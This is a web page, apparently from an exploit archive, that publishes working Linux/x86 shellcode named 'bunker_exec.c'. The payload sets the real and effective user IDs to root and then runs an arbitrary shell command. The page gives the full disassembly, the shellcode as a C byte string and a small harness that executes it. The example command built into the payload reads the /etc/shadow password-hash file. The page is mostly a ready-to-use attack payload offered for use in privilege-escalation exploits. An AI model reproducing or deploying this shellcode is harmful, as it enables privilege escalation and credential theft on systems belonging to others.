<html><head><title>Linux/x86 - setreuid(0, 0) + execve(/bin//sh, [/bin//sh, -c, cmd], NULL);</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * bunker_exec.c V1.3 - Tue Mar 21 22:50:18 CET 2006
 *
 * Linux/x86 bytecode that executes command after setreuid
 * (9 + 40 bytes + cmd)
 * 
 * setreuid(0, 0) + execve(&quot;/bin//sh&quot;, [&quot;/bin//sh&quot;,&quot;-c&quot;,&quot;cmd&quot;], NULL);
 *
 * &quot;cmd&quot; MUST be terminated with &quot;;&quot; (better with &quot;;exit;&quot; :-D)
 *
 * bunker - http://rawlab.mindcreations.com
 * 37F1 A7A1 BB94 89DB A920  3105 9F74 7349 AF4C BFA2
 *
 * setreuid(0, 0);
 * 00000000  6a46              push byte +0x46
 * 00000002  58                pop eax
 * 00000003  31db              xor ebx,ebx
 * 00000005  31c9              xor ecx,ecx
 * 00000007  cd80              int 0x80
 *
 * execve(&quot;/bin//sh&quot;, [&quot;/bin//sh&quot;, &quot;-c&quot;, &quot;cmd&quot;], NULL);
 * 00000009  eb21              jmp short 0x2c
 * 0000000b  5f                pop edi
 * 0000000c  6a0b              push byte +0xb
 * 0000000e  58                pop eax
 * 0000000f  99                cdq
 * 00000010  52                push edx
 * 00000011  66682d63          push word 0x632d
 * 00000015  89e6              mov esi,esp
 * 00000017  52                push edx
 * 00000018  682f2f7368        push dword 0x68732f2f
 * 0000001d  682f62696e        push dword 0x6e69622f
 * 00000022  89e3              mov ebx,esp
 * 00000024  52                push edx
 * 00000025  57                push edi
 * 00000026  56                push esi
 * 00000027  53                push ebx
 * 00000028  89e1              mov ecx,esp
 * 0000002a  cd80              int 0x80
 * 0000002c  e8daffffff        call 0xb
 * 00000031  ....              &quot;cmd; exit;&quot;
 */

char sc[]=
&quot;\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99&quot; 
&quot;\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62&quot;
&quot;\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xff&quot;
&quot;cat /etc/shadow; exit;&quot;;

main() { int(*f)()=(int(*)())sc;f(); }



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
